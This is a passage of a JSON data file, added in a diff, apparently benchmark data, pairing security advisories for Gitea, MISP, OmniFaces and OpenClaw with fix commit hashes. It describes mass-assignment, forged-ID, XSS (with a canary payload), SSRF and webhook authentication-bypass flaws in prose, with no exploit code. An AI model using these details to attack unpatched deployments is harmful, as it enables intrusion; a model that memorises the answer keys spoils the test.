+          "url": "https://api.github.com/repos/go-gitea/gitea/security-advisories/GHSA-prr9-9mp4-5gp2",
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "go",
+                "name": "gitea.dev"
+              },
+              "patched_versions": "1.27.0",
+              "vulnerable_functions": [],
+              "vulnerable_version_range": "<= 1.26.4"
+            }
+          ],
+          "withdrawn_at": null
+        }
+      }
+    },
+    "repo": "go-gitea/gitea",
+    "selected_fixes": [
+      "44ea3a8d24638ca4a395d641d39f476ae1dc421d"
+    ]
+  },
+  "misp-mass-assignment@canonical": {
+    "ids": {
+      "CVE-2026-56422": {
+        "cve": {
+          "containers": {
+            "adp": [
+              {
+                "metrics": [
+                  {
+                    "other": {
+                      "content": {
+                        "id": "CVE-2026-56422",
+                        "options": [
+                          {
+                            "Exploitation": "none"
+                          },
+                          {
+                            "Automatable": "no"
+                          },
+                          {
+                            "Technical Impact": "total"
+                          }
+                        ],
+                        "role": "CISA Coordinator",
+                        "timestamp": "2026-06-22T16:09:12.774625Z",
+                        "version": "2.0.3"
+                      },
+                      "type": "ssvc"
+                    }
+                  }
+                ],
+                "providerMetadata": {
+                  "dateUpdated": "2026-06-22T16:09:17.731Z",
+                  "orgId": "134c704f-9b21-4f2e-91b3-4a467353bcc0",
+                  "shortName": "CISA-ADP"
+                },
+                "title": "CISA ADP Vulnrichment"
+              }
+            ],
+            "cna": {
+              "affected": [
+                {
+                  "defaultStatus": "unaffected",
+                  "product": "misp",
+                  "repo": "https://github.com/misp/misp",
+                  "vendor": "misp",
+                  "versions": [
+                    {
+                      "lessThanOrEqual": "2.5.41",
+                      "status": "affected",
+                      "version": "0",
+                      "versionType": "semver"
+                    }
+                  ]
+                }
+              ],
+              "credits": [
+                {
+                  "lang": "en",
+                  "type": "remediation developer",
+                  "value": "Andras Iklody"
+                },
+                {
+                  "lang": "en",
+                  "type": "analyst",
+                  "value": "Jeroen Pinoy"
+                },
+                {
+                  "lang": "en",
+                  "type": "tool",
+                  "value": "Claude (the international export version)"
+                },
+                {
+                  "lang": "en",
+                  "type": "analyst",
+                  "value": "Jakub Chyliński"
+                }
+              ],
+              "descriptions": [
+                {
+                  "lang": "en",
+                  "supportingMedia": [
+                    {
+                      "base64": false,
+                      "type": "text/html",
+                      "value": "<p>Multiple MISP core controllers and model capture paths accepted client-controlled request fields such as primary keys (<code>id</code>) and ownership/scope foreign keys (<code>event_id</code>, <code>org_id</code>, <code>user_id</code>, <code>sharing_group_id</code>, <code>galaxy_cluster_uuid</code>, <code>organisation_uuid</code>, and related nested object identifiers) without consistently stripping, pinning, or revalidating them against the server-authorized object.</p><p>In affected paths, an authenticated user with access to one authorized object could submit crafted REST or form payloads that caused MISP to save data against a different object than the one checked by the authorization logic. Depending on the endpoint, this could allow object overwrite, object re-parenting, ownership transfer, unauthorized sharing-group scoping, event/object injection, proposal retargeting, or stored attacker-controlled content appearing in another user’s context.</p><p>The fixes harden affected create/edit/import flows by stripping client-supplied primary keys on create-only saves, re-pinning route- or database-authorized identifiers before save operations, validating effective sharing-group scope, and adding field whitelists where ownership fields must never be editable. The initial broad fix also added a central <code>CRUDComponent::edit()</code>&nbsp;primary-key re-pin so payload-supplied IDs cannot redirect saves away from the already-authorized row. GitHub’s patch for <code>7acf8220c</code>&nbsp;describes this central issue as <code>CRUDComponent::edit()</code>&nbsp;copying supplied fields, including a payload primary key, onto the loaded record, allowing CakePHP <code>save()</code>&nbsp;to update an arbitrary row unless the loaded ID is re-pinned. </p><br>"
+                    }
+                  ],
+                  "value": "Multiple MISP core controllers and model capture paths accepted client-controlled request fields such as primary keys (id) and ownership/scope foreign keys (event_id, org_id, user_id, sharing_group_id, galaxy_cluster_uuid, organisation_uuid, and related nested object identifiers) without consistently stripping, pinning, or revalidating them against the server-authorized object.\n\nIn affected paths, an authenticated user with access to one authorized object could submit crafted REST or form payloads that caused MISP to save data against a different object than the one checked by the authorization logic. Depending on the endpoint, this could allow object overwrite, object re-parenting, ownership transfer, unauthorized sharing-group scoping, event/object injection, proposal retargeting, or stored attacker-controlled content appearing in another user’s context.\n\nThe fixes harden affected create/edit/import flows by stripping client-supplied primary keys on create-only saves, re-pinning route- or database-authorized identifiers before save operations, validating effective sharing-group scope, and adding field whitelists where ownership fields must never be editable. The initial broad fix also added a central CRUDComponent::edit() primary-key re-pin so payload-supplied IDs cannot redirect saves away from the already-authorized row. GitHub’s patch for 7acf8220c describes this central issue as CRUDComponent::edit() copying supplied fields, including a payload primary key, onto the loaded record, allowing CakePHP save() to update an arbitrary row unless the loaded ID is re-pinned."
+                }
+              ],
+              "impacts": [
+                {
+                  "capecId": "CAPEC-115",
+                  "descriptions": [
+                    {
+                      "lang": "en",
+                      "value": "CAPEC-115 Authentication Bypass"
+                    }
+                  ]
+                }
+              ],
+              "metrics": [
+                {
+                  "cvssV4_0": {
+                    "Automatable": "NOT_DEFINED",
+                    "Recovery": "NOT_DEFINED",
+                    "Safety": "NOT_DEFINED",
+                    "attackComplexity": "LOW",
+                    "attackRequirements": "NONE",
+                    "attackVector": "NETWORK",
+                    "baseScore": 9.4,
+                    "baseSeverity": "CRITICAL",
+                    "privilegesRequired": "LOW",
+                    "providerUrgency": "NOT_DEFINED",
+                    "subAvailabilityImpact": "HIGH",
+                    "subConfidentialityImpact": "HIGH",
+                    "subIntegrityImpact": "HIGH",
+                    "userInteraction": "NONE",
+                    "valueDensity": "NOT_DEFINED",
+                    "vectorString": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+                    "version": "4.0",
+                    "vulnAvailabilityImpact": "HIGH",
+                    "vulnConfidentialityImpact": "HIGH",
+                    "vulnIntegrityImpact": "HIGH",
+                    "vulnerabilityResponseEffort": "NOT_DEFINED"
+                  },
+                  "format": "CVSS",
+                  "scenarios": [
+                    {
+                      "lang": "en",
+                      "value": "GENERAL"
+                    }
+                  ]
+                }
+              ],
+              "problemTypes": [
+                {
+                  "descriptions": [
+                    {
+                      "cweId": "CWE-639",
+                      "description": "CWE-639 Authorization Bypass Through User-Controlled Key",
+                      "lang": "en",
+                      "type": "CWE"
+                    }
+                  ]
+                }
+              ],
+              "providerMetadata": {
+                "dateUpdated": "2026-06-23T05:58:54.059Z",
+                "orgId": "5a6e4751-2f3f-4070-9419-94fb35b644e8",
+                "shortName": "CIRCL"
+              },
+              "references": [
+                {
+                  "tags": [
+                    "patch"
+                  ],
+                  "url": "https://github.com/MISP/MISP/commit/7acf8220cafac58bcfb362da37aca512fe4bb396"
+                },
+                {
+                  "tags": [
+                    "patch"
+                  ],
+                  "url": "https://github.com/MISP/MISP/commit/bc182d55dde5686a36ca2eb88fe6c2adabb9fad9"
+                },
+                {
+                  "tags": [
+                    "patch"
+                  ],
+                  "url": "https://github.com/MISP/MISP/commit/58f637aaab4d133e72f1454ebb963191d96d3b78"
+                },
+                {
+                  "tags": [
+                    "patch"
+                  ],
+                  "url": "https://github.com/MISP/MISP/commit/05aad418c57bb78e6b58a843d70d45de8f50db45"
+                },
+                {
+                  "tags": [
+                    "patch"
+                  ],
+                  "url": "https://github.com/MISP/MISP/commit/63aebc27a878233b9475c742985aaef909bc755b"
+                },
+                {
+                  "tags": [
+                    "patch"
+                  ],
+                  "url": "https://github.com/MISP/MISP/commit/00b2e3dae56fa24ea750eb525cc4709b7e5bee85"
+                },
+                {
+                  "tags": [
+                    "patch"
+                  ],
+                  "url": "https://github.com/MISP/MISP/commit/634f1f87c295193486c08c2c7ba1fee8a7339baa"
+                },
+                {
+                  "tags": [
+                    "patch"
+                  ],
+                  "url": "https://github.com/MISP/MISP/commit/ab9619dfa6cb5210fd20fb3b0b57006e4fc93916"
+                },
+                {
+                  "tags": [
+                    "patch"
+                  ],
+                  "url": "https://github.com/MISP/MISP/commit/8311427c2edd72a8341f0a65e1f11073d7ad9191"
+                },
+                {
+                  "tags": [
+                    "patch"
+                  ],
+                  "url": "https://github.com/MISP/MISP/commit/c80a3533b3d787f45f5185a4621cc0f05b0cf2e5"
+                },
+                {
+                  "tags": [
+                    "patch"
+                  ],
+                  "url": "https://github.com/MISP/MISP/commit/025f711506850aadb69cde1b57e5e5d57628c87f"
+                },
+                {
+                  "tags": [
+                    "patch"
+                  ],
+                  "url": "https://github.com/MISP/MISP/commit/3ff6bd9cfdab5d41b4667ea7298d88ffd6f3fcb8"
+                },
+                {
+                  "tags": [
+                    "patch"
+                  ],
+                  "url": "https://github.com/MISP/MISP/commit/84bafe69f5d0ab7f811371c0801a613f271ebc0b"
+                },
+                {
+                  "tags": [
+                    "patch"
+                  ],
+                  "url": "https://github.com/MISP/MISP/commit/2cc26f38f3e85c594957899f09043d5193146607"
+                },
+                {
+                  "tags": [
+                    "patch"
+                  ],
+                  "url": "https://github.com/MISP/MISP/commit/57433015815e59db5a1f11536f90920952cf3fcd"
+                },
+                {
+                  "url": "https://github.com/MISP/MISP/commit/9341690e9b6dde7f0605edea5533e05ba7362e35"
+                }
+              ],
+              "source": {
+                "discovery": "UNKNOWN"
+              },
+              "title": "MISP Core: Mass Assignment and Object Re-ownership via Unvalidated Request Fields",
+              "x_generator": {
+                "engine": "Vulnogram 0.2.0"
+              }
+            }
+          },
+          "cveMetadata": {
+            "assignerOrgId": "5a6e4751-2f3f-4070-9419-94fb35b644e8",
+            "assignerShortName": "CIRCL",
+            "cveId": "CVE-2026-56422",
+            "datePublished": "2026-06-22T11:43:02.690Z",
+            "dateReserved": "2026-06-22T11:42:55.345Z",
+            "dateUpdated": "2026-06-23T05:58:54.059Z",
+            "state": "PUBLISHED"
+          },
+          "dataType": "CVE_RECORD",
+          "dataVersion": "5.2"
+        }
+      }
+    },
+    "repo": "MISP/MISP",
+    "selected_fixes": [
+      "025f711506850aadb69cde1b57e5e5d57628c87f"
+    ]
+  },
+  "omnifaces-combined-resource@canonical": {
+    "ids": {
+      "GHSA-FP43-VJ7G-PG92": {
+        "global": {
+          "credits": [],
+          "cve_id": null,
+          "cvss": {
+            "score": 7.5,
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "score": 7.5,
+              "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+            },
+            "cvss_v4": {
+              "score": 0.0,
+              "vector_string": null
+            }
+          },
+          "cwes": [
+            {
+              "cwe_id": "CWE-79",
+              "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+            },
+            {
+              "cwe_id": "CWE-345",
+              "name": "Insufficient Verification of Data Authenticity"
+            },
+            {
+              "cwe_id": "CWE-770",
+              "name": "Allocation of Resources Without Limits or Throttling"
+            },
+            {
+              "cwe_id": "CWE-862",
+              "name": "Missing Authorization"
+            }
+          ],
+          "description": "## 1. Forged combined-resource IDs\n`CombinedResourceInfo` accepts a path-derived ID without an authenticity check,\ninflates it without an output limit, converts it to attacker-selected resource\nidentifiers, and retains unique IDs in an unbounded static cache. In bounded\ntests, 20,754 encoded bytes inflated to 16,000,000 characters (about 770:1;\nabout 49 MB observed heap delta), and 200 unique IDs added 200 permanent cache\nentries. A legitimately shaped short ID remained about 1:1, while malformed\ninput was rejected; the missing distinction is between a server-issued ID and\nan attacker-minted but structurally valid ID.\n\nThe minimal application also confirmed three sink tails from the same forged-ID\nroot:\n\n- A wildcard CDN mapping performed a server-side fetch and relayed the exact\n  loopback-canary body. This requires the documented combined-resource and\n  wildcard-CDN configuration.\n- A forged inner `.xhtml` resource bypassed the excluded-resource boundary and\n  returned its raw content.\n- A forged `omnifaces.graphic` inner resource plus a canary `Host` header caused\n  an outbound GET to that host. This result is blind and deployment-dependent;\n  I am not claiming arbitrary-scheme or arbitrary-destination SSRF.\n\nThese behaviors reproduce after the fix for CVE-2026-41883 /\nGHSA-vp6r-9m58-5xv8. That advisory concerned EL evaluation order in the wildcard\nCDN path. This report has a different root: unsigned combined IDs and missing\ndecode/cache bounds, with separately demonstrated residual sink behavior.\n\n## 2. Source-map cache \n\nWith the documented optional source-map handler above a synthetic resource\nhandler, 40 unique missing combined-resource requests grew the process-wide\nsource-map cache from 13 to 92 entries. It has no size or eviction bound. This\nhas a separate cache, configuration prerequisite, and fix from family 1.\n\n## 3. HashParam callback output\n\nA URL-fragment value containing a single-quote JavaScript payload was stored by\n`o:hashParam` and later written unescaped into the Ajax callback script. On the\nfollow-up Ajax render, real Chrome executed the canary\n`window.__omniXss=1337`. This requires a page using `o:hashParam` and the\nfollow-up Ajax render.\n\n## 4. Session/view push-channel replay \n\nA fresh WebSocket client with no HTTP cookie connected using a victim's\nsession-scoped channel ID and received the victim's subsequent push. The code\nchecks application-wide ID existence but does not bind the handshake to the\ncurrent HTTP session, despite the documented current-session guarantee. The\nUUID remains an unguessable bearer-token prerequisite; this is replay after\ntoken exposure, not brute force.\n\n## 5. Push idle-connection and fanout behavior \n\nTwelve independent clients joined one application-scoped channel and all 12\nreceived the same push. Current code sets every accepted session's maximum idle\ntimeout to zero, retains sessions in an unbounded per-channel queue, and walks\nthe full queue on each push. I am reporting the demonstrated mechanism as a\nbounded design weakness: container connection limits remain an outer bound,\nand I am not claiming unbounded heap growth from the 12-client test.\n\n## Intentionally excluded leads\n\n- A duplicate-Range response-amplification lead was disproved. Twenty-four\n  ranges produced only one response body because the stream wrapper closes\n  after the first range. I am not reporting it as a security issue.\n- The older `Servlets.facesRedirect` XML issue is fixed on the current branch.\n  I am not reporting it as a new current-upstream issue.\n\n## Expected invariants\n\n- Only server-issued combined IDs should be accepted; decoding and caches\n  should be bounded; excluded resources and dynamic handlers should not become\n  attacker-selected inner resources.\n- Dynamic URLs should not derive an outbound destination from an untrusted\n  `Host` header.\n- Source-map lookups should not create unbounded process-lifetime state.\n- `HashParam` values must be escaped for a JavaScript string inside an XML\n  CDATA callback.\n- Session/view push subscriptions should be bound to the owning HTTP session or\n  authenticated principal; idle limits and per-channel caps should remain\n  operator-controllable.\n\n## Suggested fixes and available evidence\n\n- Authenticate generated combined IDs with a per-deployment secret, cap\n  inflated output, bound the combined cache, and avoid caching failed loads.\n- Require an existing/registered inner resource before wildcard remapping and\n  reject excluded resource types at serve time.\n- Derive dynamic-resource origins from trusted configuration rather than the\n  request `Host` value.\n- Bound or evict the source-map cache.\n- Apply JavaScript-string plus CDATA-safe encoding to `HashParam` callback\n  values.\n- Capture and verify HTTP-session or principal ownership during the WebSocket\n  handshake; retain a finite idle timeout and configurable per-channel limits.\n\nDaniel Birtwhistle",
+          "ghsa_id": "GHSA-fp43-vj7g-pg92",
+          "github_reviewed_at": "2026-07-24T22:35:27Z",
+          "html_url": "https://github.com/advisories/GHSA-fp43-vj7g-pg92",
+          "identifiers": [
+            {
+              "type": "GHSA",
+              "value": "GHSA-fp43-vj7g-pg92"
+            }
+          ],
+          "nvd_published_at": null,
+          "published_at": "2026-07-24T22:35:27Z",
+          "references": [
+            "https://github.com/omnifaces/omnifaces/security/advisories/GHSA-fp43-vj7g-pg92",
+            "https://github.com/omnifaces/omnifaces/commit/59d6c5188c39418546fe500d05036645987a77d1",
+            "https://github.com/omnifaces/omnifaces/commit/a52b92461cf39d983f51ce8724fe7e6b944073e4",
+            "https://github.com/omnifaces/omnifaces/commit/aa42da361821ddfbb85b126564e71587347d2786",
+            "https://github.com/omnifaces/omnifaces/commit/c43eef01174a4dc09cec44eff553ff6284150af7",
+            "https://github.com/omnifaces/omnifaces/commit/d5cae243c4692555efaa4ba774e0f8f60e3f4db5",
+            "https://github.com/advisories/GHSA-fp43-vj7g-pg92"
+          ],
+          "repository_advisory_url": "https://api.github.com/repos/omnifaces/omnifaces/security-advisories/GHSA-fp43-vj7g-pg92",
+          "severity": "high",
+          "source_code_location": "https://github.com/omnifaces/omnifaces",
+          "summary": "OmniFaces: Forged combined-resource IDs and related output/push boundaries",
+          "type": "reviewed",
+          "updated_at": "2026-07-24T22:35:29Z",
+          "url": "https://api.github.com/advisories/GHSA-fp43-vj7g-pg92",
+          "vulnerabilities": [
+            {
+              "first_patched_version": "1.14.3",
+              "package": {
+                "ecosystem": "maven",
+                "name": "org.omnifaces:omnifaces"
+              },
+              "vulnerable_functions": [],
+              "vulnerable_version_range": "< 1.14.3"
+            },
+            {
+              "first_patched_version": "2.7.33",
+              "package": {
+                "ecosystem": "maven",
+                "name": "org.omnifaces:omnifaces"
+              },
+              "vulnerable_functions": [],
+              "vulnerable_version_range": ">= 2.0.0, < 2.7.33"
+            },
+            {
+              "first_patched_version": "3.14.23",
+              "package": {
+                "ecosystem": "maven",
+                "name": "org.omnifaces:omnifaces"
+              },
+              "vulnerable_functions": [],
+              "vulnerable_version_range": ">= 3.0.0, < 3.14.23"
+            },
+            {
+              "first_patched_version": "4.7.12",
+              "package": {
+                "ecosystem": "maven",
+                "name": "org.omnifaces:omnifaces"
+              },
+              "vulnerable_functions": [],
+              "vulnerable_version_range": ">= 4.0.0, < 4.7.12"
+            },
+            {
+              "first_patched_version": "5.4.2",
+              "package": {
+                "ecosystem": "maven",
+                "name": "org.omnifaces:omnifaces"
+              },
+              "vulnerable_functions": [],
+              "vulnerable_version_range": ">= 5.0.0, < 5.4.2"
+            }
+          ],
+          "withdrawn_at": null
+        },
+        "repo": {
+          "author": null,
+          "closed_at": null,
+          "collaborating_teams": null,
+          "collaborating_users": null,
+          "created_at": null,
+          "credits": [],
+          "credits_detailed": [],
+          "cve_id": null,
+          "cvss": {
+            "score": 7.5,
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "score": 7.5,
+              "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+            },
+            "cvss_v4": {
+              "score": null,
+              "vector_string": null
+            }
+          },
+          "cwe_ids": [],
+          "cwes": [],
+          "description": "Hello OmniFaces maintainers,\r\n\r\nMy name is Daniel Birtwhistle. In my role, I research security flaws that could\r\naffect GE HealthCare products and the software they inherit or depend on. During\r\nthat work I identified several behaviors in OmniFaces. Because they may affect\r\nother users as well, I am sharing them directly so you can assess them privately.\r\nI will be the technical point of contact and am happy to test fixes.\r\n\r\nI have not published these issues or opened a public ticket. My proposed\r\npackaging is five independently fixable families in this one private report;\r\nplease split or merge advisories as you think best.\r\n\r\n## Scope and currency\r\n\r\nI tested the direct combined-resource primitives on release 5.4.1 and the 5.x\r\nbranch. I also ran a minimal application against unmodified 5.x commit\r\n`55549bee349f70a03ae81b5f2fe612f73eed530f` (5.4.2-SNAPSHOT), with Tomcat\r\n11.0.24, Mojarra 4.1.10, OpenJDK 21.0.11, and Chrome 150. The upstream unit\r\nsuite (160 tests) and the new integration test passed.\r\n\r\nOn 2026-07-19 I checked the 14-commit delta from that tested commit to the\r\nthen-current 5.x head, `ac21045aac8a37ea0110785bdc7bd46c747b3779`. None of\r\nthe relevant combined-resource, source-map, HashParam, or WebSocket/push logic\r\nchanged. The two implicated files present in the delta contain unrelated\r\nrefactors: precompiling a class-name-cleanup regular expression in\r\n`GraphicResource`, and replacing RFC 1123 `SimpleDateFormat` use in `Utils`.\r\n\r\n## 1. Forged combined-resource IDs (F-01/F-04/F-05/F-06/F-21)\r\n\r\n`CombinedResourceInfo` accepts a path-derived ID without an authenticity check,\r\ninflates it without an output limit, converts it to attacker-selected resource\r\nidentifiers, and retains unique IDs in an unbounded static cache. In bounded\r\ntests, 20,754 encoded bytes inflated to 16,000,000 characters (about 770:1;\r\nabout 49 MB observed heap delta), and 200 unique IDs added 200 permanent cache\r\nentries. A legitimately shaped short ID remained about 1:1, while malformed\r\ninput was rejected; the missing distinction is between a server-issued ID and\r\nan attacker-minted but structurally valid ID.\r\n\r\nThe minimal application also confirmed three sink tails from the same forged-ID\r\nroot:\r\n\r\n- A wildcard CDN mapping performed a server-side fetch and relayed the exact\r\n  loopback-canary body. This requires the documented combined-resource and\r\n  wildcard-CDN configuration.\r\n- A forged inner `.xhtml` resource bypassed the excluded-resource boundary and\r\n  returned its raw content.\r\n- A forged `omnifaces.graphic` inner resource plus a canary `Host` header caused\r\n  an outbound GET to that host. This result is blind and deployment-dependent;\r\n  I am not claiming arbitrary-scheme or arbitrary-destination SSRF.\r\n\r\nThese behaviors reproduce after the fix for CVE-2026-41883 /\r\nGHSA-vp6r-9m58-5xv8. That advisory concerned EL evaluation order in the wildcard\r\nCDN path. This report has a different root: unsigned combined IDs and missing\r\ndecode/cache bounds, with separately demonstrated residual sink behavior.\r\n\r\n## 2. Source-map cache (F-22)\r\n\r\nWith the documented optional source-map handler above a synthetic resource\r\nhandler, 40 unique missing combined-resource requests grew the process-wide\r\nsource-map cache from 13 to 92 entries. It has no size or eviction bound. This\r\nhas a separate cache, configuration prerequisite, and fix from family 1.\r\n\r\n## 3. HashParam callback output (F-13)\r\n\r\nA URL-fragment value containing a single-quote JavaScript payload was stored by\r\n`o:hashParam` and later written unescaped into the Ajax callback script. On the\r\nfollow-up Ajax render, real Chrome executed the canary\r\n`window.__omniXss=1337`. This requires a page using `o:hashParam` and the\r\nfollow-up Ajax render.\r\n\r\n## 4. Session/view push-channel replay (F-18)\r\n\r\nA fresh WebSocket client with no HTTP cookie connected using a victim's\r\nsession-scoped channel ID and received the victim's subsequent push. The code\r\nchecks application-wide ID existence but does not bind the handshake to the\r\ncurrent HTTP session, despite the documented current-session guarantee. The\r\nUUID remains an unguessable bearer-token prerequisite; this is replay after\r\ntoken exposure, not brute force.\r\n\r\n## 5. Push idle-connection and fanout behavior (F-20)\r\n\r\nTwelve independent clients joined one application-scoped channel and all 12\r\nreceived the same push. Current code sets every accepted session's maximum idle\r\ntimeout to zero, retains sessions in an unbounded per-channel queue, and walks\r\nthe full queue on each push. I am reporting the demonstrated mechanism as a\r\nbounded design weakness: container connection limits remain an outer bound,\r\nand I am not claiming unbounded heap growth from the 12-client test.\r\n\r\n## Intentionally excluded leads\r\n\r\n- A duplicate-Range response-amplification lead was disproved. Twenty-four\r\n  ranges produced only one response body because the stream wrapper closes\r\n  after the first range. I am not reporting it as a security issue.\r\n- The older `Servlets.facesRedirect` XML issue is fixed on the current branch.\r\n  I am not reporting it as a new current-upstream issue.\r\n\r\n## Expected invariants\r\n\r\n- Only server-issued combined IDs should be accepted; decoding and caches\r\n  should be bounded; excluded resources and dynamic handlers should not become\r\n  attacker-selected inner resources.\r\n- Dynamic URLs should not derive an outbound destination from an untrusted\r\n  `Host` header.\r\n- Source-map lookups should not create unbounded process-lifetime state.\r\n- `HashParam` values must be escaped for a JavaScript string inside an XML\r\n  CDATA callback.\r\n- Session/view push subscriptions should be bound to the owning HTTP session or\r\n  authenticated principal; idle limits and per-channel caps should remain\r\n  operator-controllable.\r\n\r\n## Suggested fixes and available evidence\r\n\r\n- Authenticate generated combined IDs with a per-deployment secret, cap\r\n  inflated output, bound the combined cache, and avoid caching failed loads.\r\n- Require an existing/registered inner resource before wildcard remapping and\r\n  reject excluded resource types at serve time.\r\n- Derive dynamic-resource origins from trusted configuration rather than the\r\n  request `Host` value.\r\n- Bound or evict the source-map cache.\r\n- Apply JavaScript-string plus CDATA-safe encoding to `HashParam` callback\r\n  values.\r\n- Capture and verify HTTP-session or principal ownership during the WebSocket\r\n  handshake; retain a finite idle timeout and configurable per-channel limits.\r\n\r\nI can provide the minimal application, exact requests, filtered transcript,\r\ndirect harnesses, a tested 64 KiB inflate-cap patch, and proposed regression\r\ntests in this private thread. Please make the final affected-version, severity,\r\nCVE/GHSA, and advisory-split decisions. I am also happy to test candidate fixes.\r\n\r\nPlease acknowledge receipt and advise on your preferred advisory split and a\r\ncoordinated public date. The GitHub private report itself can serve as the\r\ntracking record.\r\n\r\nRequested credit, if useful: Daniel Birtwhistle\r\n\r\n\r\n\r\nBest Regards,\r\n\r\nDaniel Birtwhistle \r\n\r\n",
+          "ghsa_id": "GHSA-fp43-vj7g-pg92",
+          "html_url": "https://github.com/omnifaces/omnifaces/security/advisories/GHSA-fp43-vj7g-pg92",
+          "identifiers": [
+            {
+              "type": "GHSA",
+              "value": "GHSA-fp43-vj7g-pg92"
+            }
+          ],
+          "private_fork": null,
+          "published_at": "2026-07-23T17:15:08Z",
+          "publisher": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/173372?v=4",
+            "events_url": "https://api.github.com/users/BalusC/events{/privacy}",
+            "followers_url": "https://api.github.com/users/BalusC/followers",
+            "following_url": "https://api.github.com/users/BalusC/following{/other_user}",
+            "gists_url": "https://api.github.com/users/BalusC/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/BalusC",
+            "id": 173372,
+            "login": "BalusC",
+            "node_id": "MDQ6VXNlcjE3MzM3Mg==",
+            "organizations_url": "https://api.github.com/users/BalusC/orgs",
+            "received_events_url": "https://api.github.com/users/BalusC/received_events",
+            "repos_url": "https://api.github.com/users/BalusC/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/BalusC/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/BalusC/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/BalusC",
+            "user_view_type": "public"
+          },
+          "severity": "high",
+          "state": "published",
+          "submission": null,
+          "summary": "Forged combined-resource IDs and related output/push boundaries in OmniFaces 5.4.1",
+          "updated_at": "2026-07-23T17:15:08Z",
+          "url": "https://api.github.com/repos/omnifaces/omnifaces/security-advisories/GHSA-fp43-vj7g-pg92",
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "maven",
+                "name": "org.omnifaces:omnifaces"
+              },
+              "patched_versions": "1.14.3",
+              "vulnerable_functions": [],
+              "vulnerable_version_range": "< 1.14.3"
+            },
+            {
+              "package": {
+                "ecosystem": "maven",
+                "name": "org.omnifaces:omnifaces"
+              },
+              "patched_versions": "2.7.33",
+              "vulnerable_functions": [],
+              "vulnerable_version_range": ">= 2.0, < 2.7.33"
+            },
+            {
+              "package": {
+                "ecosystem": "maven",
+                "name": "org.omnifaces:omnifaces"
+              },
+              "patched_versions": "3.14.23",
+              "vulnerable_functions": [],
+              "vulnerable_version_range": ">= 3.0, < 3.14.23"
+            },
+            {
+              "package": {
+                "ecosystem": "maven",
+                "name": "org.omnifaces:omnifaces"
+              },
+              "patched_versions": "4.7.12",
+              "vulnerable_functions": [],
+              "vulnerable_version_range": ">= 4.0, < 4.7.12"
+            },
+            {
+              "package": {
+                "ecosystem": "maven",
+                "name": "org.omnifaces:omnifaces"
+              },
+              "patched_versions": "5.4.2",
+              "vulnerable_functions": [],
+              "vulnerable_version_range": ">= 5.0, < 5.4.2"
+            }
+          ],
+          "withdrawn_at": null
+        }
+      }
+    },
+    "repo": "omnifaces/omnifaces",
+    "selected_fixes": [
+      "a52b92461cf39d983f51ce8724fe7e6b944073e4"
+    ]
+  },
+  "openclaw-feishu-webhook@canonical": {
+    "ids": {
+      "CVE-2026-32974": {
+        "cve": {
+          "containers": {
+            "adp": [
+              {
+                "metrics": [
+                  {
+                    "other": {
+                      "content": {
+                        "id": "CVE-2026-32974",
+                        "options": [
+                          {
+                            "Exploitation": "none"
+                          },
+                          {
+                            "Automatable": "yes"
+                          },
+                          {
+                            "Technical Impact": "partial"
+                          }
+                        ],
+                        "role": "CISA Coordinator",
+                        "timestamp": "2026-04-01T15:32:09.323184Z",
+                        "version": "2.0.3"
+                      },
+                      "type": "ssvc"
+                    }
+                  }
+                ],
+                "providerMetadata": {
+                  "dateUpdated": "2026-04-01T15:32:23.901Z",
+                  "orgId": "134c704f-9b21-4f2e-91b3-4a467353bcc0",
+                  "shortName": "CISA-ADP"
+                },
+                "title": "CISA ADP Vulnrichment"
+              }
+            ],
+            "cna": {
+              "affected": [
+                {
+                  "defaultStatus": "unaffected",
+                  "packageURL": "pkg:npm/openclaw",
+                  "product": "OpenClaw",
+                  "vendor": "OpenClaw",
+                  "versions": [
+                    {
+                      "lessThan": "2026.3.12",
+                      "status": "affected",
+                      "version": "0",
+                      "versionType": "semver"
+                    },
+                    {
+                      "status": "unaffected",
+                      "version": "2026.3.12",
+                      "versionType": "semver"
+                    }
+                  ]
+                }
+              ],
+              "cpeApplicability": [
+                {
+                  "nodes": [
+                    {
+                      "cpeMatch": [
+                        {
+                          "criteria": "cpe:2.3:a:openclaw:openclaw:*:*:*:*:*:node.js:*:*",
+                          "versionEndExcluding": "2026.3.12",
+                          "vulnerable": true
+                        }
+                      ],
+                      "negate": false,
+                      "operator": "OR"
+                    }
+                  ]
+                }
+              ],
+              "credits": [
+                {
+                  "lang": "en",
+                  "type": "reporter",
+                  "value": "lintsinghua"
+                }
+              ],
+              "datePublic": "2026-03-13T00:00:00.000Z",
+              "descriptions": [
+                {
+                  "lang": "en",
+                  "value": "OpenClaw before 2026.3.12 contains an authentication bypass vulnerability in Feishu webhook mode when only verificationToken is configured without encryptKey, allowing acceptance of forged events. Unauthenticated network attackers can inject forged Feishu events and trigger downstream tool execution by reaching the webhook endpoint."
+                }
+              ],
+              "metrics": [
+                {
+                  "cvssV3_1": {
+                    "attackComplexity": "LOW",
+                    "attackVector": "NETWORK",
+                    "availabilityImpact": "LOW",
+                    "baseScore": 8.6,
+                    "baseSeverity": "HIGH",
+                    "confidentialityImpact": "LOW",
+                    "integrityImpact": "HIGH",
+                    "privilegesRequired": "NONE",
+                    "scope": "UNCHANGED",
+                    "userInteraction": "NONE",
+                    "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L",
+                    "version": "3.1"
+                  },
+                  "cvssV4_0": {
+                    "attackComplexity": "LOW",
+                    "attackRequirements": "NONE",
+                    "attackVector": "NETWORK",
+                    "baseScore": 8.8,
